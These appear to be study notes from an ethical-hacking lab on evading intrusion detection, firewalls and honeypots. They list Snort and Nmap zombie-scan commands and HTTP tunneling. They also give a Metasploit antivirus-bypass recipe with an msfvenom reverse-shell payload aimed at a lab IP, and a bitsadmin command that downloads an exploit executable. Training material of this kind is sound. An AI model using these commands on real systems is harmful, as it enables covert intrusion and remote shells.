# Evading IDS, Firewalls and honeypots

## Perform intrusion detection using various tools

- Detect intrusions using Snort
windows application
apply rule
snort -W (list interface)
snort -dev -i 1 (enable the Ethernet Driver)

- Detect malicious network traffic using ZoneAlarm FREE FIREWALL
windows software

- Detect malicious network traffic using HoneyBOT

## Evade firewalls using various evasion techniques

- Bypass windows firewall using Nmap evasion techniques
Zombie Scan: nmap -sI 10.10.1.22 10.10.1.11

- Bypass firewall rules using HTTP/FTP tunneling
start htthost
install httport 3.SNFM establish "Port mapping"
connect to localhost to use the tunnel

- Bypass antivirus using Metasploit templates
/usr/share/metasploit-framework/data/templates/src/pe/exe/template.c
change the payload size from 4096 to 4000
i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe
msfvenom -pwindows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe -f exe > /home/attacker/bypass.exe

- Bypass firewall through Windows BITSAdmin

bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe
